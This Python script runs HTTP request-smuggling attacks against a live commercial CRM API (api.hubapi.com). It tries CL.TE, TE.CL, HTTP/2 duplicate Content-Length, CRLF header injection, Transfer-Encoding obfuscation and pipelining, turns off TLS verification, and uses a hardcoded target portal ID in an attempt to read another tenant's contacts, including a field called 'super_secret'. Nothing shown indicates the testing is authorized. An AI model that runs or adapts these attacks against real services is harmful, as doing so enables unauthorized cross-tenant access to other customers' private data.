#!/usr/bin/env python3
"""
HTTP Request Smuggling and Advanced Protocol Attacks
"""

import socket
import ssl
import time
import os
from dotenv import load_dotenv

load_dotenv()

ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
TARGET_PORTAL = os.getenv('TARGET_PORTAL_ID', '46962361')

print("="*80)
print(" HTTP Request Smuggling & Protocol Attacks")
print("="*80)

def send_raw_request(host, port, request, use_ssl=True):
    """Send raw HTTP request"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)

        if use_ssl:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            sock = context.wrap_socket(sock, server_hostname=host)

        sock.connect((host, port))
        sock.sendall(request.encode())

        response = b""
        while True:
            try:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk

                # Stop if we get a complete response
                if b'\r\n\r\n' in response and (b'Content-Length: 0' in response or len(response) > 1000):
                    break
            except socket.timeout:
                break

        sock.close()
        return response.decode('utf-8', errors='ignore')
    except Exception as e:
        return f"Error: {e}"

# ============================================================================
# 1. CL.TE (Content-Length vs Transfer-Encoding)
# ============================================================================

def test_cl_te_smuggling():
    """Test CL.TE request smuggling"""
    print("\n[*] Testing CL.TE Request Smuggling...")

    # Smuggled request tries to access target portal
    smuggled_request = f"GET /crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}&properties=firstname,super_secret,email HTTP/1.1\r\n" \
                      f"Host: api.hubapi.com\r\n" \
                      f"Authorization: Bearer {ACCESS_TOKEN}\r\n" \
                      f"\r\n"

    request = f"POST /crm/v3/objects/contacts/search HTTP/1.1\r\n" \
             f"Host: api.hubapi.com\r\n" \
             f"Authorization: Bearer {ACCESS_TOKEN}\r\n" \
             f"Content-Type: application/json\r\n" \
             f"Content-Length: {len(smuggled_request)}\r\n" \
             f"Transfer-Encoding: chunked\r\n" \
             f"\r\n" \
             f"{smuggled_request}"

    response = send_raw_request('api.hubapi.com', 443, request)
    print(f"Response length: {len(response)}")

    if 'firstname' in response.lower() or 'super_secret' in response.lower():
        print(" POTENTIAL SMUGGLING SUCCESS!")
        print(response[:500])
        return response
    else:
        print(f"Response: {response[:200]}")

# ============================================================================
# 2. TE.CL (Transfer-Encoding vs Content-Length)
# ============================================================================

def test_te_cl_smuggling():
    """Test TE.CL request smuggling"""
    print("\n[*] Testing TE.CL Request Smuggling...")

    smuggled = f"GET /crm/v3/objects/contacts/1?portalId={TARGET_PORTAL} HTTP/1.1\r\n" \
              f"Host: api.hubapi.com\r\n" \
              f"Authorization: Bearer {ACCESS_TOKEN}\r\n" \
              f"\r\n"

    chunk = f"{len(smuggled):x}\r\n{smuggled}\r\n0\r\n\r\n"

    request = f"POST /crm/v3/objects/contacts/search HTTP/1.1\r\n" \
             f"Host: api.hubapi.com\r\n" \
             f"Authorization: Bearer {ACCESS_TOKEN}\r\n" \
             f"Content-Type: application/json\r\n" \
             f"Transfer-Encoding: chunked\r\n" \
             f"Content-Length: 4\r\n" \
             f"\r\n" \
             f"{chunk}"

    response = send_raw_request('api.hubapi.com', 443, request)

    if 'firstname' in response or 'super_secret' in response:
        print(" POTENTIAL SMUGGLING SUCCESS!")
        print(response[:500])
        return response
    else:
        print(f"Response: {response[:200]}")

# ============================================================================
# 3. HTTP/2 Smuggling
# ============================================================================

def test_http2_smuggling():
    """Test HTTP/2 specific smuggling"""
    print("\n[*] Testing HTTP/2 Smuggling (via headers)...")

    # HTTP/2 doesn't support chunked encoding, but some gateways might convert
    # Try sending conflicting content-length headers

    request = f"POST /crm/v3/objects/contacts/search HTTP/2\r\n" \
             f"Host: api.hubapi.com\r\n" \
             f"Authorization: Bearer {ACCESS_TOKEN}\r\n" \
             f"Content-Type: application/json\r\n" \
             f"Content-Length: 100\r\n" \
             f"Content-Length: 50\r\n" \
             f"\r\n" \
             f'{{"filterGroups":[],"properties":["firstname","super_secret"],"portalId":"{TARGET_PORTAL}"}}'

    response = send_raw_request('api.hubapi.com', 443, request)
    print(f"Response: {response[:200]}")

# ============================================================================
# 4. Header Injection
# ============================================================================

def test_header_injection():
    """Test CRLF injection in headers"""
    print("\n[*] Testing Header Injection...")

    # Try to inject additional headers
    injected_portal = f"{TARGET_PORTAL}\\r\\nX-Portal-Override: {TARGET_PORTAL}\\r\\nX-Injected: true"

    request = f"GET /crm/v3/objects/contacts/1?portalId={injected_portal} HTTP/1.1\r\n" \
             f"Host: api.hubapi.com\r\n" \
             f"Authorization: Bearer {ACCESS_TOKEN}\r\n" \
             f"\r\n"

    response = send_raw_request('api.hubapi.com', 443, request)
    print(f"Response: {response[:200]}")

# ============================================================================
# 5. HTTP Desync Attacks
# ============================================================================

def test_http_desync():
    """Test HTTP desync using space/tab variations"""
    print("\n[*] Testing HTTP Desync...")

    # Try different variations of Transfer-Encoding header
    variations = [
        "Transfer-Encoding: chunked",
        "Transfer-Encoding: chunked ",  # Trailing space
        "Transfer-Encoding:chunked",    # No space
        "Transfer-Encoding:\tchunked",  # Tab instead of space
        "Transfer-Encoding: xchunked",  # Prefix
        "Transfer-Encoding: chunkedx",  # Suffix
        " Transfer-Encoding: chunked",  # Leading space
    ]

    for te_header in variations:
        smuggled = f"GET /crm/v3/objects/contacts/1?portalId={TARGET_PORTAL} HTTP/1.1\r\nHost: api.hubapi.com\r\n\r\n"

        request = f"POST /crm/v3/objects/contacts/search HTTP/1.1\r\n" \
                 f"Host: api.hubapi.com\r\n" \
                 f"Authorization: Bearer {ACCESS_TOKEN}\r\n" \
                 f"Content-Type: application/json\r\n" \
                 f"{te_header}\r\n" \
                 f"Content-Length: {len(smuggled)}\r\n" \
                 f"\r\n" \
                 f"{smuggled}"

        response = send_raw_request('api.hubapi.com', 443, request)

        if 'firstname' in response or 'super_secret' in response:
            print(f" SUCCESS with: {te_header}")
            print(response[:500])
            return response

# ============================================================================
# 6. Pipeline Confusion
# ============================================================================

def test_pipeline_confusion():
    """Test HTTP pipelining attacks"""
    print("\n[*] Testing HTTP Pipelining...")

    # Send multiple requests in one connection
    request1 = f"GET /crm/v3/objects/contacts/1 HTTP/1.1\r\n" \
              f"Host: api.hubapi.com\r\n" \
              f"Authorization: Bearer {ACCESS_TOKEN}\r\n" \
              f"\r\n"

    request2 = f"GET /crm/v3/objects/contacts/1?portalId={TARGET_PORTAL}&properties=firstname,super_secret HTTP/1.1\r\n" \
              f"Host: api.hubapi.com\r\n" \
              f"Authorization: Bearer {ACCESS_TOKEN}\r\n" \
              f"Connection: close\r\n" \
              f"\r\n"

    pipelined = request1 + request2

    response = send_raw_request('api.hubapi.com', 443, pipelined)
    print(f"Response length: {len(response)}")

    if 'super_secret' in response:
        print(" POTENTIAL SUCCESS!")
        print(response[:500])

# ============================================================================
# MAIN
# ============================================================================

print("\n Warning: These are aggressive protocol attacks")
print("Testing HTTP smuggling vulnerabilities...\n")

test_cl_te_smuggling()
test_te_cl_smuggling()
test_http2_smuggling()
test_header_injection()
test_http_desync()
test_pipeline_confusion()

print("\n" + "="*80)
print(" HTTP Smuggling Tests Complete")
print("="*80)
